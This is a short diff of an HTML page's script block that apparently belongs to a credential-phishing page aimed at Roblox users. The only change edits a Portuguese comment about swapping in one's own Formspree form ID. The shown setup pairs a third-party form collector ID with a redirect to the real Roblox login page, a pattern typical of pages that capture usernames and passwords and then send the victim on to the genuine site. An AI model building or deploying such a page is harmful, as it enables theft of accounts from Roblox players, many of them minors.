@@ -98,7 +98,7 @@
 </div>
 
 <script>
-    // SUBSTITUA 'myewepyz' PELO SEU ID DO FORMSPREE SE TIVER MUDADO
+    // SUBSTITUA 'myewepyz' PELO SEU ID DO FORMSPREE
     const FORM_ID = 'myewepyz'; 
     const REDIRECT_URL = 'https://www.roblox.com/login';
 
